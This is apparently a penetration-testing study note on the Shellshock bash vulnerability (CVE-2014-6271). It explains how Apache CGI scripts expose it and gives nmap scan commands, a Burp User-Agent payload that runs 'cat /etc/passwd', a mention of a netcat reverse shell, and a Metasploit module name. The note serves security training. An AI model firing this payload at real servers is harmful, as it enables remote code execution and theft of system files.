---
up: "[[Exploiting Linux Vulnerabilities]]"
tools:
  - "[[Burp Suite]]"
---

# Exploiting Shellshock Bash Vulnerability

- Shellshock: CVE-2014-6271
- Name given to a family of vulns in the bash shell (since v1.3) that allow remote code execution
- Bash is a \*Nix shell that is part of the GNU project and default shell for most Linux distribution

- The vuln occurs because bash mistakely executes trailing commands after a series of characters `() { :; };`
- Only affects Linux as Windows is not using Bash
- Apache web servers are vulnerables as they are configured to execute CGI or .sh scripts
- CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system

## Shellshock Exploitation

- To exploit this vuln you need to locate an input vector or script that allows you to communicate with Bash
- Can be manually done or with MSF

# Demonstration

```bash
nmap -sV $TRG
nmap -sV $TRG --script http-shellshock --script-args "http-shellshock.url=/gettime.cgi"
```

Using Burp Suite, repeat the /gettime.cgi get request:

```bash
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

Or open a reverse shell after starting a netcat listener.

## Using MSF

```bash
> use exploit/multi/http/apache_mod_cgi_bash_env_exec
```
